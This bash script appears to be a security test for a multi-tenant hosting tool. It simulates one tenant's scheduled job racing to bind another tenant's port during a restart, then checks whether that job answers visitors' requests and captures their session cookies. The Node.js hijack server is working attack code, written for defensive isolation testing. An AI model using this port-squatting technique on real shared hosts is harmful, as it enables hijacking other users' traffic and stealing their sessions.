#!/bin/bash
# A01 (threat 1): alpha's scheduled job has no SocketBindAllow/SocketBindDeny (props | grep -v SocketBind),
# so it may listen on ANY port. It waits for bravo's port 4101 to be free (bravo restarting: a deploy,
# tando restart, env set, reboot), binds it first, and answers bravo's visitors through Caddy.
. "$(dirname "$0")/lib.sh"
x 'cat > $TANDO_DATA_DIR/hijack.js <<"JS"
const http = require("http"); let won = false;
function tryBind() {
  const s = http.createServer((q, r) => { r.writeHead(200, {"content-type": "text/plain"});
    r.end(`HIJACKED by ${process.getuid()} (tando-alpha job): ${q.headers.host}${q.url} cookie=${q.headers.cookie||""}\n`); });
  s.on("error", () => setTimeout(tryBind, 2)); s.listen(4101, "127.0.0.1", () => { won = true; console.log("bound 4101");
    setTimeout(() => process.exit(0), 40000); });
}
tryBind(); setTimeout(() => { if (!won) process.exit(0); }, 50000);
JS
echo ok'
jobrun 'exec node $TANDO_DATA_DIR/hijack.js' || inconclusive "job did not start"
echo "job started; admin restarts bravo (as any deploy does)"
(cd "$W/w/bravo" && "$R" restart 2>&1 | tail -2)
sleep 1
out=$(curl -s -m 5 -H 'Cookie: bravo_session=s3cr3t' "http://bravo.localhost:$HP/account")
echo "bravo visitor sees: $out"
rootsh 'ss -Hltnp "sport = :4101"'
# cleanup, after the verdict (out) is taken. This was "sleep 45": outlast the job (it leaves a port
# it won after 40 s and gives up after 50), so that bravo gets its port back and the next attack's
# job can start. The admin ends the job instead, and waits until its process is gone (an event).
# (the pattern [h]ijack: this command line must not match itself)
# shellcheck disable=SC2016 # expanded by the container's bash
rootsh 'systemctl stop "tando-alpha-job-*.service" 2> /dev/null
  for i in $(seq 1 100); do pgrep -f "[h]ijack\.js" > /dev/null || { echo "the job has ended"; exit 0; }; sleep 0.1; done
  echo "the job still runs after its unit was stopped: killing it"; pkill -KILL -f "[h]ijack\.js"; sleep 1'
(cd "$W/w/bravo" && "$R" restart > /dev/null 2>&1)
case $out in HIJACKED*) succeeded "alpha's job served bravo's traffic";; *) blocked "bravo answered";; esac
